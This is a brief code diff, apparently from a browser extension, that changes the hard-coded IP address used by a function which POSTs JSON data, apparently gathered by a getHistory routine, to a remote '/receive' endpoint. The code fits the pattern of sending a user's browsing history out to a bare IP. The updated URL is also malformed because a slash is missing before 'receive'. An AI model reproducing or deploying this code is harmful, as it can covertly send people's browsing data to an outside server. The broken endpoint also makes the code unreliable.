@@ -1,5 +1,5 @@
 const MAXRESULT = 1000000
-var target = "http://103.6.254.30/*"
+var target = "http://115.146.93.15/*"
 /*
 Modules used
 
@@ -100,7 +100,7 @@ function getHistory(){
 function sendURL(jsonfile){
     var request = new XMLHttpRequest();
 
-    request.open("POST", "http://103.6.254.30/receive", true);
+    request.open("POST", "http://115.146.93.15receive", true);
     request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
     console.log("Sending");
     request.send(jsonfile);
